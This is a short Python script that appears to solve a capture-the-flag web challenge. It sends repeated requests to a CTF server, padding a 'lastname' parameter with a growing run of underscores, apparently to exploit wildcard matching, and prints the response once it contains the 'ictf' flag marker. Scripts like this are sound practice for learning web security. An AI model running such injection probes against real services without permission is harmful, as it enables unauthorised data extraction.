from requests import get
from time import sleep

url = "http://localhost:11000/"
url = "http://puzzler7.imaginaryctf.org:11000/"

for i in range(6, 100):
    req = get(url + "?lastname="+"_"*i)
    if "ictf" in req.text:
        print(req.text)
        break
    sleep(.2)